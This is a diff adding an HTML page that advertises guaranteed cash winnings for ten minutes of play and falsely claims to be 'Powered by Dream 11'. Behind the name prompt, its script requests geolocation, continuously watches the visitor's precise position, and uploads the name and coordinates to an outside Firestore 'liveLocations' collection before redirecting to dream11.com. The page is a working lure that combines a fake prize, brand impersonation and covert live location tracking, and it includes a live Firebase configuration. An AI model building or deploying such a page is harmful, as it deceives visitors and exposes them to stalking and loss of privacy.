@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" sizes="32x32" href="./image.png?v=2" />
+  <link rel="shortcut icon" type="image/png" href="./image.png?v=2" />
+  <link rel="apple-touch-icon" href="./image.png?v=2" />
+  <title>Play 10 Minutes, Win Cash</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background:
+        radial-gradient(circle at 15% 15%, rgba(253, 224, 71, 0.26), transparent 32%),
+        radial-gradient(circle at 85% 10%, rgba(251, 191, 36, 0.24), transparent 34%),
+        linear-gradient(160deg, #0b1020, #111827 55%, #1f2937);
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow: hidden;
+    }
+
+    .hero {
+      position: relative;
+      max-width: 860px;
+      width: 100%;
+      background: linear-gradient(165deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.04));
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 24px;
+      box-shadow: 0 26px 60px rgba(0, 0, 0, 0.4);
+      padding: 30px 30px 24px;
+      text-align: center;
+      isolation: isolate;
+    }
+
+    .coin {
+      position: absolute;
+      width: 84px;
+      aspect-ratio: 1;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, #fef9c3, #f59e0b 65%, #b45309);
+      border: 4px solid #facc15;
+      box-shadow: 0 10px 24px rgba(245, 158, 11, 0.45);
+      display: grid;
+      place-items: center;
+      font-size: 1.5rem;
+      animation: float 3.8s ease-in-out infinite;
+      z-index: -1;
+    }
+
+    .coin.one {
+      top: -24px;
+      left: -18px;
+    }
+
+    .coin.two {
+      right: -18px;
+      top: 70px;
+      width: 68px;
+      animation-delay: 0.8s;
+    }
+
+    .coin.three {
+      bottom: -20px;
+      left: 8%;
+      width: 74px;
+      animation-delay: 1.4s;
+    }
+
+    .coin.four {
+      bottom: 10px;
+      right: 10%;
+      width: 60px;
+      animation-delay: 2s;
+    }
+
+    @keyframes float {
+      0%,
+      100% {
+        transform: translateY(0) rotate(0deg);
+      }
+      50% {
+        transform: translateY(-12px) rotate(5deg);
+      }
+    }
+
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-bottom: 18px;
+    }
+
+    .chip {
+      font-size: 0.84rem;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+      padding: 7px 12px;
+      border-radius: 999px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.08);
+    }
+
+    .chip.live {
+      color: #86efac;
+      border-color: rgba(34, 197, 94, 0.45);
+      background: rgba(22, 163, 74, 0.18);
+    }
+
+    .chip.timer {
+      color: #fde68a;
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: clamp(1.8rem, 4vw, 2.8rem);
+      line-height: 1.18;
+      font-weight: 800;
+      text-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    p {
+      margin: 0 0 14px;
+      font-size: 1.06rem;
+      line-height: 1.62;
+      color: #e5e7eb;
+    }
+
+    .highlight-line {
+      margin: 22px 0 18px;
+      border-radius: 14px;
+      padding: 16px;
+      background: linear-gradient(90deg, rgba(234, 179, 8, 0.2), rgba(250, 204, 21, 0.12));
+      border: 1px solid rgba(250, 204, 21, 0.35);
+      font-size: 1.08rem;
+      color: #fef3c7;
+      font-weight: 600;
+    }
+
+    .highlight {
+      color: #facc15;
+      font-weight: 800;
+    }
+
+    .offer-grid {
+      margin: 18px 0 22px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 12px;
+    }
+
+    .offer-card {
+      padding: 14px 12px;
+      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .offer-label {
+      margin: 0;
+      font-size: 0.85rem;
+      color: #d1d5db;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .offer-value {
+      margin: 6px 0 0;
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #fef08a;
+    }
+
+    .note {
+      margin: 0;
+      font-size: 0.95rem;
+      color: #bfdbfe;
+    }
+
+    .cta {
+      margin-top: 18px;
+      display: inline-block;
+      text-decoration: none;
+      background: linear-gradient(180deg, #facc15, #f59e0b);
+      color: #111827;
+      font-weight: 800;
+      letter-spacing: 0.2px;
+      padding: 13px 28px;
+      border-radius: 12px;
+      box-shadow: 0 14px 24px rgba(245, 158, 11, 0.35);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 18px 26px rgba(245, 158, 11, 0.45);
+    }
+
+    .trust {
+      margin-top: 16px;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+      color: #cbd5e1;
+      font-size: 0.88rem;
+    }
+
+    .trust span {
+      padding: 6px 10px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.13);
+    }
+
+    .powered {
+      margin-top: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-size: 0.95rem;
+      color: #e2e8f0;
+    }
+
+    .powered strong {
+      color: #f8fafc;
+      letter-spacing: 0.2px;
+    }
+
+    .powered-logo {
+      width: 30px;
+      height: 30px;
+      border-radius: 8px;
+      object-fit: cover;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.25);
+    }
+
+    .status-message {
+      margin-top: 12px;
+      min-height: 48px;
+      font-size: 0.9rem;
+      color: #c7d2fe;
+      white-space: pre-line;
+      text-align: left;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.75);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 20;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    .modal {
+      width: min(520px, 100%);
+      background: #0f172a;
+      border: 1px solid rgba(148, 163, 184, 0.3);
+      border-radius: 16px;
+      box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
+      padding: 20px;
+    }
+
+    .modal h2 {
+      margin: 0 0 8px;
+      font-size: 1.3rem;
+    }
+
+    .modal p {
+      margin: 0 0 12px;
+      font-size: 0.95rem;
+      color: #cbd5e1;
+    }
+
+    .form-label {
+      display: block;
+      text-align: left;
+      margin-bottom: 6px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #e2e8f0;
+    }
+
+    .input {
+      width: 100%;
+      border: 1px solid rgba(148, 163, 184, 0.45);
+      background: rgba(15, 23, 42, 0.6);
+      color: #f8fafc;
+      border-radius: 10px;
+      padding: 11px 12px;
+      font-size: 0.98rem;
+      outline: none;
+      margin-bottom: 12px;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 10px;
+      justify-content: flex-end;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      border: 0;
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .btn-secondary {
+      background: rgba(148, 163, 184, 0.2);
+      color: #e2e8f0;
+    }
+
+    .btn-primary {
+      background: linear-gradient(180deg, #facc15, #f59e0b);
+      color: #111827;
+    }
+
+    @media (max-width: 560px) {
+      .hero {
+        padding: 22px 16px;
+      }
+
+      .coin {
+        opacity: 0.75;
+      }
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+</head>
+<body>
+  <main class="hero">
+    <div class="coin one">₹</div>
+    <div class="coin two">₹</div>
+    <div class="coin three">₹</div>
+    <div class="coin four">₹</div>
+
+    <div class="topbar">
+      <span class="chip live">Live Rewards</span>
+      <span class="chip timer">10-Minute Challenge</span>
+    </div>
+
+    <h1>Play a Game for 10 Minutes and Win Real Cash</h1>
+    <p>
+      We provide cash rewards for gameplay. Complete the quick challenge and win up to
+      <span class="highlight">Rs 10,000</span>.
+    </p>
+
+    <div class="highlight-line">
+      Guaranteed winnings start from <span class="highlight">Rs 1,000</span>.
+    </div>
+
+    <section class="offer-grid" aria-label="Offer details">
+      <article class="offer-card">
+        <p class="offer-label">Minimum Reward</p>
+        <p class="offer-value">Rs 1,000</p>
+      </article>
+      <article class="offer-card">
+        <p class="offer-label">Maximum Reward</p>
+        <p class="offer-value">Rs 10,000</p>
+      </article>
+      <article class="offer-card">
+        <p class="offer-label">Play Time</p>
+        <p class="offer-value">10 Minutes</p>
+      </article>
+    </section>
+
+    <p class="note">Join now, play instantly, and unlock your guaranteed winning range.</p>
+    <p class="note">No credit card or bank details needed. Just play and withdraw however you want.</p>
+    <a class="cta" href="#" id="startPlayingBtn">Start Playing Now</a>
+
+    <div class="trust">
+      <span>Instant Joining</span>
+      <span>Secure Rewards</span>
+      <span>Daily Payout Slots</span>
+    </div>
+
+    <div class="powered">
+      <img class="powered-logo" src="./image.png" alt="Dream 11 logo" />
+      <span>Powered by <strong>Dream 11</strong></span>
+    </div>
+    <p class="status-message" id="statusMessage"></p>
+  </main>
+  <div class="modal-overlay" id="userModal" aria-hidden="true">
+    <div class="modal">
+      <h2>Before you continue</h2>
+      <p>Name</p>
+      <label class="form-label" for="playerName">Your name</label>
+      <input class="input" id="playerName" type="text" placeholder="Enter your name" maxlength="40" />
+      <div class="modal-actions">
+        <button class="btn btn-secondary" type="button" id="cancelModalBtn">Cancel</button>
+        <button class="btn btn-primary" type="button" id="continueBtn">Continue</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function () {
+      const startPlayingBtn = document.getElementById("startPlayingBtn");
+      const userModal = document.getElementById("userModal");
+      const continueBtn = document.getElementById("continueBtn");
+      const cancelModalBtn = document.getElementById("cancelModalBtn");
+      const playerNameInput = document.getElementById("playerName");
+      const statusMessage = document.getElementById("statusMessage");
+      if (
+        !startPlayingBtn ||
+        !userModal ||
+        !continueBtn ||
+        !cancelModalBtn ||
+        !playerNameInput ||
+        !statusMessage
+      ) {
+        return;
+      }
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyAazO2YlOZTh5skC4uVJFeZY2gcqcjK-oc",
+        authDomain: "phoenix-6dbf3.firebaseapp.com",
+        projectId: "phoenix-6dbf3",
+        storageBucket: "phoenix-6dbf3.firebasestorage.app",
+        messagingSenderId: "944519683751",
+        appId: "1:944519683751:web:cd3be449a69bac662d0582"
+      };
+
+      let db = null;
+      const hasValidFirebaseConfig = Object.values(firebaseConfig).every(function (value) {
+        return typeof value === "string" && !value.startsWith("REPLACE_WITH_");
+      });
+
+      if (hasValidFirebaseConfig && window.firebase) {
+        if (!firebase.apps.length) {
+          firebase.initializeApp(firebaseConfig);
+        }
+        db = firebase.firestore();
+      }
+
+      function setStatus(message) {
+        statusMessage.textContent = message;
+      }
+
+      function addStatusLine(message) {
+        if (!statusMessage.textContent) {
+          statusMessage.textContent = message;
+          return;
+        }
+        statusMessage.textContent += "\n" + message;
+      }
+
+      function getFirebaseErrorMessage(error) {
+        if (!error) return "Unknown Firebase error.";
+        const code = error.code || "unknown";
+        const message = error.message || "No error message available.";
+        return "Firebase error (" + code + "): " + message;
+      }
+
+      function openModal() {
+        userModal.classList.add("show");
+        userModal.setAttribute("aria-hidden", "false");
+        setStatus("");
+      }
+
+      function closeModal() {
+        userModal.classList.remove("show");
+        userModal.setAttribute("aria-hidden", "true");
+      }
+
+      async function startLiveLocationTracking(name, statusMessages) {
+        addStatusLine("Checking location support...");
+        if (!("geolocation" in navigator)) {
+          statusMessages.push("Geolocation is not supported in this browser.");
+          addStatusLine("This browser does not support location.");
+          return;
+        }
+
+        if (!window.isSecureContext) {
+          statusMessages.push("Location works only on HTTPS or localhost.");
+          addStatusLine("Location blocked: open this page on HTTPS or localhost.");
+          return;
+        }
+
+        if (!db) {
+          statusMessages.push("Location sharing skipped (Firebase config missing).");
+          addStatusLine("Firebase not available for live tracking.");
+          return;
+        }
+
+        const userId = "player_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+        const playerRef = db.collection("liveLocations").doc(userId);
+        addStatusLine("Requesting location permission...");
+
+        // Probe write once to expose permission/config errors immediately.
+        try {
+          await playerRef.set(
+            {
+              name: name,
+              trackingEnabled: true,
+              initializedAt: firebase.firestore.FieldValue.serverTimestamp()
+            },
+            { merge: true }
+          );
+        } catch (error) {
+          const detailed = getFirebaseErrorMessage(error);
+          statusMessages.push("Location sharing failed.");
+          statusMessages.push(detailed);
+          setStatus(detailed);
+          return;
+        }
+
+        await new Promise(function (resolve) {
+          navigator.geolocation.getCurrentPosition(
+            function () {
+              addStatusLine("Location permission granted.");
+              resolve();
+            },
+            function (error) {
+              if (error && error.code === error.PERMISSION_DENIED) {
+                addStatusLine("Location permission denied.");
+                statusMessages.push("Location permission denied.");
+              } else {
+                addStatusLine("Could not fetch current location.");
+                statusMessages.push("Could not fetch current location.");
+              }
+              resolve();
+            },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
+          );
+        });
+
+        navigator.geolocation.watchPosition(
+          async function (position) {
+            try {
+              await playerRef.set(
+                {
+                  name: name,
+                  lat: position.coords.latitude,
+                  lng: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                  trackingEnabled: true,
+                  updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                },
+                { merge: true }
+              );
+              addStatusLine("Location is getting tracked...");
+            } catch (error) {
+              setStatus(getFirebaseErrorMessage(error));
+            }
+          },
+          function (error) {
+            if (error && error.code === error.PERMISSION_DENIED) {
+              setStatus("Location permission denied. Continuing without live tracking.");
+            } else {
+              setStatus("Could not access location right now.");
+            }
+          },
+          { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+        );
+
+        statusMessages.push("Location sharing started.");
+        addStatusLine("Live tracking started.");
+      }
+
+      startPlayingBtn.addEventListener("click", async function (event) {
+        event.preventDefault();
+        openModal();
+      });
+
+      cancelModalBtn.addEventListener("click", function () {
+        closeModal();
+      });
+
+      continueBtn.addEventListener("click", async function () {
+        const name = playerNameInput.value.trim();
+        if (!name) {
+          setStatus("Please enter your name to continue.");
+          playerNameInput.focus();
+          return;
+        }
+
+        continueBtn.disabled = true;
+        setStatus("Starting...");
+        const statusMessages = [];
+        try {
+          await startLiveLocationTracking(name, statusMessages);
+
+          closeModal();
+          if (statusMessages.length > 0) {
+            addStatusLine(statusMessages.join(" | "));
+          }
+          addStatusLine("Redirecting to Dream11...");
+          setTimeout(function () {
+            window.location.href = "https://www.dream11.com/en-US";
+          }, 1500);
+        } catch (error) {
+          setStatus("Unable to process permissions right now.");
+          window.location.href = "https://www.dream11.com/en-US";
+        } finally {
+          continueBtn.disabled = false;
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
